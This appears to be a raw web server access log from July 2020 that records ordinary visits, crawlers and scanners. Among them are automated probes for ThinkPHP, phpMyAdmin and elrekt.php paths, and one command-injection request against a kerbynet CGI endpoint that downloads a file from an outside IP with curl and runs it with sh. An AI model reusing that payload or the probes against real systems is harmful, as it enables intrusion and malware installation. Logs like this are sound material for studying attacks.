- - [29/Jul/2020:06:34:14 +0000] "GET / HTTP/1.1" 200 4163 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [29/Jul/2020:07:43:51 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [29/Jul/2020:10:56:56 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
- - [29/Jul/2020:12:39:17 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [29/Jul/2020:12:39:18 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [29/Jul/2020:12:46:32 +0000] "GET / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [29/Jul/2020:15:32:44 +0000] "GET /TP/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:46 +0000] "GET /TP/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:46 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:47 +0000] "GET /html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:47 +0000] "GET /public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:48 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:49 +0000] "GET /elrekt.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:52 +0000] "GET /index.php HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:15:32:57 +0000] "GET / HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [29/Jul/2020:16:14:08 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
- - [29/Jul/2020:17:20:54 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [29/Jul/2020:18:33:06 +0000] "GET / HTTP/1.1" 200 3970 "-" - "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
- - [29/Jul/2020:20:48:19 +0000] "GET / HTTP/1.1" 200 4026 "-" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
- - [29/Jul/2020:20:55:09 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
- - [29/Jul/2020:22:13:29 +0000] "GET / HTTP/1.0" 200 2406 "-" - "-"
- - [29/Jul/2020:22:39:30 +0000] "GET / HTTP/1.1" 200 1251 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:30 +0000] "GET /css/main.css HTTP/1.1" 200 739 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:30 +0000] "GET /favicon.ico HTTP/1.1" 200 399 "-" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:31 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 420 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:32 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:32 +0000] "GET /content/big_data.php HTTP/1.1" 200 3770 "http://160.40.52.164/" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:22:39:33 +0000] "POST /storage/store_sess_total_mousemv_db.php HTTP/1.1" 200 421 "http://160.40.52.164/content/big_data.php" ktvnpmoa2vkkhe39b466k5717p "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
- - [29/Jul/2020:23:26:11 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 404 1835 "-" - "-"
- - [30/Jul/2020:01:16:32 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
- - [30/Jul/2020:02:57:28 +0000] "GET / HTTP/1.1" 200 3970 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
- - [30/Jul/2020:02:57:31 +0000] "\n" 400 1531 "-" - "-"
- - [30/Jul/2020:02:57:36 +0000] "\n" 400 1547 "-" - "-"
- - [30/Jul/2020:02:57:36 +0000] "\n" 400 1525 "-" - "-"
- - [30/Jul/2020:02:57:37 +0000] "\n" 400 1732 "-" - "-"
- - [30/Jul/2020:02:57:42 +0000] "\n" 400 1525 "-" - "-"
- - [30/Jul/2020:02:57:43 +0000] "\n" 400 1525 "-" - "-"
- - [30/Jul/2020:02:57:51 +0000] "GET /robots.txt HTTP/1.1" 200 2378 "-" - "-"
- - [30/Jul/2020:02:57:54 +0000] "GET /sitemap.xml HTTP/1.1" 404 2015 "-" - "-"
- - [30/Jul/2020:02:58:00 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 2457 "-" - "-"
- - [30/Jul/2020:02:58:10 +0000] "\n" 400 1967 "-" - "-"
- - [30/Jul/2020:02:58:36 +0000] "-" 408 1525 "-" - "-"
- - [30/Jul/2020:03:21:44 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [30/Jul/2020:03:21:45 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 zgrab/0.x"
- - [30/Jul/2020:05:54:24 +0000] "GET /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
- - [30/Jul/2020:05:54:25 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 1816 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
